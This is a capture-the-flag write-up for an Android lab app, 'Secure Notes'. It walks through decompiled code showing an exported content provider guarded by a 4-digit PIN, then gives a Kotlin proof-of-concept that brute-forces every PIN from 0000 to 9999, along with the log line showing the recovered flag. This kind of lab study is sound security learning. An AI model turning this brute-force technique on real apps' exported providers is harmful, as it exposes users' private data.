---
date: '2025-03-31T22:47:33+08:00'
title: 'MHL Secure Notes'
tags:
    - MHL
    - Android CTF
---

## Challenge Description

> Welcome to the Secure Notes Challenge! This lab immerses you in the intricacies of Android content providers, challenging you to crack a PIN code protected by a content provider within an Android application. It's an excellent opportunity to explore Android's data management and security features.
>
> [securenote.apk](static/securenotes.apk)

## Solution

As usual, I start out by reading the code using static analysis

### Static Analysis

To read the apk code, I used `jadx-gui`. 

```xml
<provider
    android:name="com.mobilehackinglab.securenotes.SecretDataProvider"
    android:enabled="true"
    android:exported="true"
    android:authorities="com.mobilehackinglab.securenotes.secretprovider"/>
<activity
    android:name="com.mobilehackinglab.securenotes.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
```

I noticed that the provider has `exported=true` which mean I could just easily access the provider. I then look into the `SecretDataProvider` to have a look of the code.

```java
@Override // android.content.ContentProvider
public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
    Object m130constructorimpl;
    Intrinsics.checkNotNullParameter(uri, "uri");
    MatrixCursor matrixCursor = null;
    if (selection == null || !StringsKt.startsWith$default(selection, "pin=", false, 2, (Object) null)) {
        return null;
    }
    String removePrefix = StringsKt.removePrefix(selection, (CharSequence) "pin=");
    try {
        StringCompanionObject stringCompanionObject = StringCompanionObject.INSTANCE;
        String format = String.format("%04d", Arrays.copyOf(new Object[]{Integer.valueOf(Integer.parseInt(removePrefix))}, 1));
        Intrinsics.checkNotNullExpressionValue(format, "format(format, *args)");
        try {
            Result.Companion companion = Result.INSTANCE;
            SecretDataProvider $this$query_u24lambda_u241 = this;
            m130constructorimpl = Result.m130constructorimpl($this$query_u24lambda_u241.decryptSecret(format));
        } catch (Throwable th) {
            Result.Companion companion2 = Result.INSTANCE;
            m130constructorimpl = Result.m130constructorimpl(ResultKt.createFailure(th));
        }
        if (Result.m136isFailureimpl(m130constructorimpl)) {
            m130constructorimpl = null;
        }
        String secret = (String) m130constructorimpl;
        if (secret != null) {
            MatrixCursor $this$query_u24lambda_u243_u24lambda_u242 = new MatrixCursor(new String[]{"Secret"});
            $this$query_u24lambda_u243_u24lambda_u242.addRow(new String[]{secret});
            matrixCursor = $this$query_u24lambda_u243_u24lambda_u242;
        }
        return matrixCursor;
    } catch (NumberFormatException e) {
        return null;
    }
}
```

Based on this partial code, this is content provider which works something like a SQL. based on the code, it seems to be looking for a 4 digit pin code and it has a query of `pin=????`. This mean that I could probably create some easy brute force attack to get the result. After understanding it, things will be easier as I don't really need any other information as for now.

### Dynamic Analysis

After understanding it, I quickly created an POC apk to prove it is possible to read information from the content provider.

```kotlin
@Composable
fun Test1() {
    val context = LocalContext.current
    val contentUri = Uri.parse("content://com.mobilehackinglab.securenotes.secretprovider")
    val scope = CoroutineScope(Dispatchers.Default)
    repeat(10000) { number ->
        scope.launch {
            val format = String.format("%04d", number)
            val sqlquery = "pin=$format"
            Log.i("yeet","now trying: $sqlquery")
            context.contentResolver.query(contentUri, null, sqlquery, null, null)?.use { cursor ->
                if (cursor.moveToFirst()) {
                    val sb = StringBuilder()
                    do {
                        for (i in 0 until cursor.columnCount) {
                            if (i > 0) sb.append(", ")
                            sb.append("${cursor.getColumnName(i)} = ${cursor.getString(i)}")
                        }
                        sb.append("\n")
                    } while (cursor.moveToNext())
                    Log.i("yeet","$sqlquery ; $sb")
                }

            }
        }
    }
}
```

Basically this kotlin code will easily interact with the content provider to perform brute force attack from 0 to 9999. The `scope.launch` is there to make the brute force attack to be slightly faster.

```xml
<queries>
    <package android:name="com.mobilehackinglab.securenotes" />
</queries>
```

It is required to add this `queries` if the android version is api 30 and above to communicate with the content provider.

```bash
2025-03-31 23:14:11.516 26075-26115 yeet                    io.ks.mhlsecurenote                  I  pin=2580 ; Secret = CTF{D1d_y0u_gu3ss_1t!1?}
```

My POC code will print the output at log if there's some interesting result. 

## Things I learned from this challenge

- content provider brute force
- insecure / exported provider vulnerability